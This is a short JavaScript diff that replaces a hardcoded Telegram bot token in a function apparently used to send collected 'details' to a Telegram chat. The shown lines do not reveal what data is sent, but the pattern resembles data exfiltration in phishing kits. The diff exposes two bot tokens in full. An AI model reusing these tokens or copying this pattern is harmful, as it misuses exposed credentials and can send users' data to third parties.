@@ -341,7 +341,7 @@ function sendDeatilsToTelegram(message) {
   // Function to send a Telegram message
   sendTelegramMessage(message)
   async function sendTelegramMessage(message) {
-      const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+      const url = `https://api.telegram.org/bot8113534372:AAHv5kZrbYlR0WyiKgmFgWXPQm9p_88IIMw/sendMessage`;
       try {
           // Send the message to the Telegram bot
           await fetch(url, {
@@ -356,4 +356,5 @@ function sendDeatilsToTelegram(message) {
           console.error("Error sending message", error);
       }
   }
+
 }
